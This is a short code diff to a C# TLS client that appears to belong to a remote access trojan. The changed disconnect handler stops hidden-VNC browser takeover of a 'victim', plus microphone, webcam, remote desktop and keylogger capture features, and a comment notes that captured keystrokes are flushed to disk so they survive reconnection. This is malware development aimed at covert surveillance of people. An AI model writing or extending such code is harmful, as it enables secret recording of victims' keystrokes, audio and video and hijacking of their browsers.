@@ -195,9 +195,14 @@ internal class TlsClient : IDisposable
         // Read loop - handles all incoming commands
         await ReadLoop(sessionCt);
 
-        // Connection lost or server-initiated disconnect: stop HVNC so the victim's real
-        // browser profile locks are cleaned up and they can reopen Edge/Chrome normally.
+        // Connection lost or server-initiated disconnect: clean up all active capture features.
+        // HVNC must stop first so browser profile locks are released before the mic/cam.
         HvncFeature.Stop();
+        MicrophoneFeature.Stop();
+        RemoteDesktopFeature.Stop();
+        WebcamFeature.Stop();
+        // Keylogger: Stop() flushes buffered keystrokes to disk so they survive the reconnect.
+        KeyloggerFeature.Stop();
     }
 
     // ── Detached process spawn via CreateProcessW ────────────────────────
